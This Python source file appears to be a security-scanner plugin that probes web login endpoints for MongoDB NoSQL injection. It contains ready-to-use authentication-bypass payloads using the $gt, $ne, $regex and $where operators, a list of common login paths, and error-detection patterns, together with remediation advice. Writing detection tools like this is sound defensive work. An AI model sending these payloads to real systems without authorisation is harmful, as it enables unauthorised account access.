"""
NoSQL Injection Scanner
Tests for MongoDB-style NoSQL injection in web application parameters.
Detects operator injection ($gt, $ne, $regex) and authentication bypass.
"""
import asyncio
import json
import re
import ssl
import urllib.parse

from app.scanner.plugins.base import Plugin, PluginMeta, PluginResult, Finding
from app.scanner.context import stable_fingerprint

META = PluginMeta(
    plugin_id="web.nosql_injection",
    name="NoSQL Injection Scanner",
    category="web",
    depends_on=["fingerprint.http"],
    consumes=["fingerprint.http", "net.open_ports"],
    provides=["web.nosql_findings"],
    enabled_by_default=True,
    timeout_seconds=30.0,
)

# NoSQL injection payloads (MongoDB operators)
_NOSQL_PAYLOADS = [
    # JSON body injection (Content-Type: application/json)
    {
        "type": "json_operator",
        "body": {"username": {"$gt": ""}, "password": {"$gt": ""}},
        "description": "$gt operator — matches any non-empty value",
    },
    {
        "type": "json_ne",
        "body": {"username": {"$ne": ""}, "password": {"$ne": ""}},
        "description": "$ne operator — matches any non-empty value",
    },
    {
        "type": "json_regex",
        "body": {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        "description": "$regex — matches everything",
    },
    {
        "type": "json_where",
        "body": {"username": "admin", "password": {"$gt": ""}, "$where": "1"},
        "description": "$where clause injection",
    },
]

# URL/form parameter injection
_PARAM_PAYLOADS = [
    ("username[$ne]=&password[$ne]=", "operator_in_param"),
    ("username[$gt]=&password[$gt]=", "gt_in_param"),
    ("username[$regex]=.*&password[$regex]=.*", "regex_in_param"),
    ("username=admin&password[$ne]=wrongpassword", "admin_bypass"),
]

# Error patterns indicating NoSQL backend
_NOSQL_ERROR_PATTERNS = [
    r"MongoError",
    r"mongo.*exception",
    r"BSON",
    r"ObjectId",
    r"mongoose",
    r"\$where",
    r"\$gt",
    r"\$ne",
    r"CastError",
    r"ValidationError.*mongo",
    r"E11000.*duplicate",
    r"Cannot apply.*non-array",
    r"bad query",
    r"BadValue",
]

# Endpoints to test
_TEST_ENDPOINTS = [
    "/login",
    "/api/login",
    "/auth/login",
    "/api/auth/login",
    "/api/v1/login",
    "/api/v1/auth/login",
    "/signin",
    "/api/signin",
    "/api/authenticate",
]


async def _http_request(host: str, port: int, method: str, path: str,
                        body: str = "", content_type: str = "application/json",
                        use_tls: bool = False, timeout: float = 5.0) -> tuple[int, str, int]:
    """Send HTTP request, return (status, body, body_length)."""
    try:
        if use_tls:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ssl_ctx), timeout=timeout
            )
        else:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout
            )

        headers = {
            "Host": host,
            "User-Agent": "VulnScan/2.1",
            "Accept": "*/*",
            "Content-Type": content_type,
            "Content-Length": str(len(body)),
            "Connection": "close",
        }

        request = f"{method} {path} HTTP/1.1\r\n"
        request += "".join(f"{k}: {v}\r\n" for k, v in headers.items())
        request += f"\r\n{body}"

        writer.write(request.encode())
        await writer.drain()

        response = await asyncio.wait_for(reader.read(32768), timeout=timeout)
        writer.close()

        text = response.decode("utf-8", errors="ignore")
        parts = text.split("\r\n\r\n", 1)
        header_block = parts[0] if parts else ""
        resp_body = parts[1] if len(parts) > 1 else ""

        status_match = re.match(r"HTTP/\d\.\d\s+(\d+)", header_block)
        status = int(status_match.group(1)) if status_match else 0

        return status, resp_body, len(resp_body)
    except Exception:
        return 0, "", 0


class Check(Plugin):
    async def run(self, target: str, ctx) -> PluginResult:
        ports = ctx.get("net.open_ports", []) or []
        http_data = (ctx.get("fingerprint.http", {}) or {}).get("http", [])
        target_raw = ctx.get("target_raw", target)
        findings = []
        nosql_results = []

        # Determine base URLs
        base_urls = []
        if re.match(r"^https?://", target_raw, re.I):
            base_urls.append(target_raw.rstrip("/"))
        else:
            for item in http_data:
                url = item.get("url", "")
                if url:
                    base_urls.append(url.rstrip("/"))
            if not base_urls:
                web_ports = [p for p in ports if p in (80, 443, 8080, 8443, 3000, 5000)]
                for p in web_ports[:2]:
                    scheme = "https" if p in (443, 8443) else "http"
                    base_urls.append(f"{scheme}://{target}:{p}")

        if not base_urls:
            return PluginResult(artifacts={"web.nosql_findings": []})

        # Also check if MongoDB port is open (indicator)
        mongo_open = 27017 in ports

        for base in base_urls[:2]:
            parsed = urllib.parse.urlparse(base)
            host = parsed.hostname or target
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            use_tls = parsed.scheme == "https"

            for endpoint in _TEST_ENDPOINTS:
                # Baseline: normal login attempt
                normal_body = json.dumps({"username": "testuser", "password": "wrongpassword"})
                baseline_status, baseline_body, baseline_len = await _http_request(
                    host, port, "POST", endpoint, normal_body, use_tls=use_tls
                )

                if baseline_status in (0, 404, 405):
                    continue

                # ── Test 1: JSON body injection ────────────────────────
                for payload_info in _NOSQL_PAYLOADS:
                    inj_body = json.dumps(payload_info["body"])
                    inj_status, inj_resp, inj_len = await _http_request(
                        host, port, "POST", endpoint, inj_body, use_tls=use_tls
                    )

                    if inj_status == 0:
                        continue

                    # Check for NoSQL errors
                    error_found = None
                    for pattern in _NOSQL_ERROR_PATTERNS:
                        if re.search(pattern, inj_resp, re.I):
                            error_found = pattern
                            break

                    # Check for auth bypass (different response from baseline)
                    auth_bypass = (
                        inj_status == 200 and baseline_status in (401, 403)
                        and inj_len > baseline_len * 1.5
                    )

                    if error_found or auth_bypass:
                        severity = "critical" if auth_bypass else "high"
                        title = (
                            f"NoSQL injection auth bypass: {endpoint}"
                            if auth_bypass
                            else f"NoSQL injection: {endpoint} ({payload_info['type']})"
                        )
                        fp = stable_fingerprint(target, META.plugin_id, endpoint, payload_info["type"])
                        findings.append(Finding(
                            severity=severity,
                            plugin_id=META.plugin_id,
                            title=title,
                            description=(
                                f"The endpoint {endpoint} is vulnerable to NoSQL injection. "
                                f"Payload: {payload_info['description']}. "
                                + (f"Authentication was BYPASSED — server returned {inj_status} "
                                   f"with {inj_len} bytes vs baseline {baseline_status} with {baseline_len} bytes."
                                   if auth_bypass else
                                   f"Server leaked a NoSQL error: {error_found}")
                            ),
                            evidence=(
                                f"url={base}{endpoint} payload_type={payload_info['type']} "
                                f"payload={inj_body[:100]} "
                                f"baseline_status={baseline_status} inj_status={inj_status} "
                                f"baseline_len={baseline_len} inj_len={inj_len} "
                                f"error={error_found or 'none'} auth_bypass={auth_bypass}"
                            ),
                            affected=target,
                            fingerprint=fp,
                            confidence=0.90 if auth_bypass else 0.80,
                            remediation=(
                                f"[{'CRITICAL' if auth_bypass else 'HIGH'}] NoSQL injection at {endpoint}\n\n"
                                f"[FIX]\n"
                                f"1. Sanitize input: reject objects/arrays in string fields\n"
                                f"2. Use mongo-sanitize or express-mongo-sanitize middleware\n"
                                f"3. Validate input types: username must be a string, not an object\n"
                                f"4. Use parameterized queries with explicit field types\n\n"
                                f"[EXPRESS.JS EXAMPLE]\n"
                                f"  const sanitize = require('express-mongo-sanitize');\n"
                                f"  app.use(sanitize());\n\n"
                                f"[MONGOOSE EXAMPLE]\n"
                                f"  User.findOne({{ username: String(req.body.username) }})"
                            ),
                            references=[
                                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                            ],
                        ))
                        nosql_results.append({"endpoint": endpoint, "type": payload_info["type"], "auth_bypass": auth_bypass})
                        break  # One confirmed payload per endpoint is enough

                # ── Test 2: URL-encoded parameter injection ────────────
                for param_payload, payload_type in _PARAM_PAYLOADS:
                    inj_status, inj_resp, inj_len = await _http_request(
                        host, port, "POST", endpoint, param_payload,
                        content_type="application/x-www-form-urlencoded",
                        use_tls=use_tls,
                    )

                    if inj_status == 0:
                        continue

                    auth_bypass = (
                        inj_status == 200 and baseline_status in (401, 403)
                        and inj_len > baseline_len * 1.5
                    )

                    if auth_bypass:
                        fp = stable_fingerprint(target, META.plugin_id, endpoint, "param_" + payload_type)
                        findings.append(Finding(
                            severity="critical",
                            plugin_id=META.plugin_id,
                            title=f"NoSQL param injection auth bypass: {endpoint}",
                            description=(
                                f"The endpoint {endpoint} is vulnerable to NoSQL operator injection "
                                f"via URL-encoded parameters. Authentication was bypassed."
                            ),
                            evidence=(
                                f"url={base}{endpoint} payload={param_payload} "
                                f"type={payload_type} inj_status={inj_status} baseline_status={baseline_status}"
                            ),
                            affected=target,
                            fingerprint=fp,
                            confidence=0.90,
                            remediation=(
                                f"[CRITICAL] NoSQL param injection at {endpoint}\n\n"
                                f"[FIX] Same as JSON injection — sanitize all input and reject operator objects."
                            ),
                            references=["https://owasp.org/www-project-web-security-testing-guide/"],
                        ))
                        nosql_results.append({"endpoint": endpoint, "type": payload_type, "auth_bypass": True})
                        break

        return PluginResult(findings=findings, artifacts={"web.nosql_findings": nosql_results})
